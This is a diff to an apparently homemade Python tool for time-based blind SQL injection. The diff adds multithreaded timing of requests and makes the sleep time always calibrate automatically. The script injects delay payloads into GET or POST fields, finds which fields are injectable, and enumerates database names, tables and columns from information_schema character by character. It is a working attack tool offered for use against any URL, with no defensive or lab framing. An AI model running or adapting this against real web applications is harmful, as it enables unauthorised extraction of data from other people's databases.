@@ -1,12 +1,12 @@
 # time-based-sql-injection
 
-import sys, argparse, ast, requests
+import sys, argparse, ast, requests, threading
 
 M_GET = 'GET'
 M_POST = 'POST'
 
 EVALUATING_ROUNDS = 10
-threads_num = 1
+threads_num = 5
 
 SQL_SUFFIX_TYPE = ['', '-- -', 'AND \'1\'=\'1']
 NO_SUFF = 0
@@ -64,7 +64,7 @@ def find_table_rows_count(url, method, headers, cookies, data, vuln_field,
             print('{{{}: {}}}'.format(vuln_field, m_data[vuln_field]))
         if log:
             file.write('{{{}: {}}}\n'.format(vuln_field, m_data[vuln_field]))
-        elapsed = measure_request_time_no_threads(url, method, headers, cookies, m_data)
+        elapsed = measure_request_time(url, method, headers, cookies, m_data)
         print(m_data)
         if elapsed >= sleep_time:
             found = True
@@ -128,7 +128,7 @@ def avg_time(times):
 def evaluate_response_time(url, method, headers, cookies, data):
     times = []
     for i in range(EVALUATING_ROUNDS):
-        times.append(measure_request_time_no_threads(url, method, headers, cookies, data))
+        times.append(measure_request_time(url, method, headers, cookies, data))
     # print(times)
     return avg_time(times)
 
@@ -142,6 +142,20 @@ def evaluate_sleep_time(response_time):
 	elif response_time >= 5:
 		return response_time * 0.5
 
+class myRequestThread(threading.Thread):
+    def __init__(self, threadID, name, url, method, headers, cookies, data, times):
+        threading.Thread.__init__(self)
+        self.threadID = threadID
+        self.name = name
+        self.url = url
+        self.method = method
+        self.headers = headers
+        self.cookies = cookies
+        self.data = data
+        self.times = times
+    def run(self):
+        self.times.append(measure_request_time_no_threads(self.url, self.method, self.headers, self.cookies, self.data))
+
 def measure_request_time_no_threads(url, method, headers, cookies, data):
     if method == M_GET:
         r = requests.get(url, headers = headers, cookies = cookies, params = data.items())
@@ -152,6 +166,21 @@ def measure_request_time_no_threads(url, method, headers, cookies, data):
     else:
         return -1
 
+def measure_request_time(url, method, headers, cookies, data):
+    if threads_num <= 1:
+        return measure_request_time_no_threads(url, method, headers, cookies, data)
+    else:
+        times = []
+        threads = []
+        for i in range(threads_num):
+            t = myRequestThread(i, 'T-'+str(i), url, method, headers, cookies, data, times)
+            t.start()
+            threads.append(t)
+        for t in threads:
+            t.join()
+        # print(times)
+        return avg_time(times)
+
 
 def find_vuln_fields(url, method, headers, cookies, data, sleep_time):
     vuln_fields ={}
@@ -161,7 +190,7 @@ def find_vuln_fields(url, method, headers, cookies, data, sleep_time):
     for field in m_data:
         m_data[field] = data[field] + sql.format('\'', sleep_time, SQL_SUFFIX_TYPE[COMMENT_SUFF])
         print(m_data[field])
-        elapsed_time = measure_request_time_no_threads(url, method, headers, cookies, m_data)
+        elapsed_time = measure_request_time(url, method, headers, cookies, m_data)
         print(elapsed_time)
 
     if elapsed_time >= sleep_time:
@@ -177,7 +206,7 @@ def find_vuln_fields(url, method, headers, cookies, data, sleep_time):
 
     for field in m_data:
         m_data[field] = data[field] + sql.format('\'', sleep_time, SQL_SUFFIX_TYPE[AND_SUFF])
-        elapsed_time = measure_request_time_no_threads(url, method, headers, cookies, m_data)
+        elapsed_time = measure_request_time(url, method, headers, cookies, m_data)
     if elapsed_time >= sleep_time:
         vuln_fields.update({field:AND_SUFF})
         print(vuln_fields)
@@ -190,7 +219,7 @@ def find_vuln_fields(url, method, headers, cookies, data, sleep_time):
 
     for field in m_data:
         m_data[field] = data[field] + sql.format('', sleep_time, SQL_SUFFIX_TYPE[NO_SUFF])
-        elapsed_time = measure_request_time_no_threads(url, method, headers, cookies, m_data)
+        elapsed_time = measure_request_time(url, method, headers, cookies, m_data)
     if elapsed_time >= sleep_time:
         vuln_fields.update({field:NO_SUFF})
 
@@ -252,7 +281,7 @@ def find_data_val_binary(url, method, headers, cookies, data, vuln_field,
                 print('{{{}: {}}}'.format(vuln_field, m_data[vuln_field]))
             if log:
                 file.write('{{{}: {}}}\n'.format(vuln_field, m_data[vuln_field]))
-            elapsed = measure_request_time_no_threads(url, method, headers, cookies, m_data)
+            elapsed = measure_request_time(url, method, headers, cookies, m_data)
             print(m_data[vuln_field])
             if elapsed >= sleep_time:
                 data_val.append(chr(current))
@@ -266,7 +295,7 @@ def find_data_val_binary(url, method, headers, cookies, data, vuln_field,
                     print('{{{}: {}}}'.format(vuln_field, m_data[vuln_field]))
                 if log:
                     file.write('{{{}: {}}}\n'.format(vuln_field, m_data[vuln_field]))
-                elapsed = measure_request_time_no_threads(url, method, headers, cookies, m_data)
+                elapsed = measure_request_time(url, method, headers, cookies, m_data)
                 print(m_data[vuln_field])
                 if elapsed >= sleep_time:
                     low = current
@@ -303,7 +332,7 @@ def find_data_length(url, method, headers, cookies, data, vuln_field, vuln_type,
             print('{{{}: {}}}'.format(vuln_field, m_data[vuln_field]))
         if log:
             file.write('{{{}: {}}}\n'.format(vuln_field, m_data[vuln_field]))
-        elapsed = measure_request_time_no_threads(url, method, headers, cookies, m_data)
+        elapsed = measure_request_time(url, method, headers, cookies, m_data)
         if elapsed == -1:
             return -1
         if elapsed >= sleep_time:
@@ -339,10 +368,9 @@ def main(argv):
     parser.add_argument('-u', '--url', help = 'The URL on which try the attack.')
     parser.add_argument('-d', '--data', help = 'Payload for data fields. {\'<field>\': \'<value>\',...}', default = '{}')
     parser.add_argument('-m', '--method', help = 'The method <GET|POST>.', metavar = '<GET|POST>', default = M_GET, choices = [M_GET, M_POST])
-    parser.add_argument('-s', '--sleep', type = int, help = 'The sleep time to use')
-    parser.add_argument('-t', '--threads', type = int, help = 'Number of threads used for evaluating response time', default = 1)
     parser.add_argument('-v', '--verbose', help = 'Set verbose mode', action = 'store_true')
     parser.add_argument('-l', '--log', help = 'Set log mode', action = 'store_true')
+    
     args = parser.parse_args()
     if len(sys.argv) == 1:
         parser.print_help()
@@ -357,12 +385,9 @@ def main(argv):
 
     url = args.url
     method = args.method
-    print(args.data)
     data = ast.literal_eval(args.data)
-    sleep_time = args.sleep
-    threads_num = args.threads
 
-    data = {'userid':'test'}
+    # data = {'userid':'test'}
     print(url)
     print(data.items())
 
@@ -380,10 +405,9 @@ def main(argv):
 
     print('\nStarting attack on URL: %s\n' % url)
 
-    if not sleep_time:
-        print('Evaluating response time...')
-        avg_resp_time = evaluate_response_time(url, method, headers, cookies, data)
-        sleep_time = evaluate_sleep_time(avg_resp_time)
+    print('Evaluating response time...')
+    avg_resp_time = evaluate_response_time(url, method, headers, cookies, data)
+    sleep_time = evaluate_sleep_time(avg_resp_time)
 
     print(sleep_time)
 
@@ -398,7 +422,6 @@ def main(argv):
     sel_vuln_field = vuln_fields[f]
     sel_vuln_type = vuln[sel_vuln_field]
 
-    # Cerco i nomi dei database #
     print('\nLooking for database names, please wait...')
 
     rows_count = find_table_rows_count(url, method, headers, cookies, data, sel_vuln_field, sel_vuln_type, INFORMATION_SCHEMA_DB_NAME, INF_SCHEMA_SCHEMATA, sleep_time)
@@ -420,12 +443,10 @@ def main(argv):
         tables.append(find_data(url, method, headers, cookies, data, sel_vuln_field, sel_vuln_type, INFORMATION_SCHEMA_DB_NAME, INF_SCHEMA_TABLES, INF_SCHEMA_TABLES_TABLE_NAME, sleep_time, i, where_params, where_values))
     ###########################################
 
-    # Seleziono una tabella #
     choice = print_user_choice_table(tables, 'Tables found:')
     table_name = tables[choice]
     print('\nTable selected: %s\n' % table_name)
 
-    # Cerco i nomi delle colonne nella tabella selezionata #
     print('Looking for columns in %s, please wait...\n' % table_name)
     where_params = [INF_SCHEMA_COLUMNS_TABLE_NAME, INF_SCHEMA_COLUMNS_TABLE_SCHEMA]
     where_values = [table_name, db_name]
